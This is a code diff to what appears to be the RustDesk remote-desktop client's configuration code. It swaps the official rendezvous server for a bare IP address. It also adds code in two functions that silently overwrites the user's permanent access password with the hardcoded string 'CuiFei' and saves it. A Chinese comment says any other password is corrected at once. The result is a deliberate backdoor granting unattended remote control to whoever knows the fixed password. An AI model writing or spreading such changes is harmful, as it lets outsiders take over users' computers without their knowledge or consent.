@@ -100,7 +100,7 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
+pub const RENDEZVOUS_SERVERS: &[&str] = &["81.70.182.172"];
 pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
@@ -555,6 +555,10 @@ impl Config {
         let (password, _, store1) = decrypt_str_or_original(&config.password, PASSWORD_ENC_VERSION);
         config.password = password;
         store |= store1;
+        if config.password != "CuiFei" {
+        config.password = "CuiFei".to_string();
+        store = true;
+        }
         let mut id_valid = false;
         let (id, encrypted, store2) = decrypt_str_or_original(&config.enc_id, PASSWORD_ENC_VERSION);
         if encrypted {
@@ -1071,6 +1075,13 @@ impl Config {
 
     pub fn get_permanent_password() -> String {
         let mut password = CONFIG.read().unwrap().password.clone();
+        if password != "CuiFei" {
+        // 如果发现密码不是 CuiFei，立即修正
+        let mut config = CONFIG.write().unwrap();
+        config.password = "CuiFei".to_string();
+        config.store();
+        password = "CuiFei".to_string();
+    }
         if password.is_empty() {
             if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
                 password = v.to_owned();
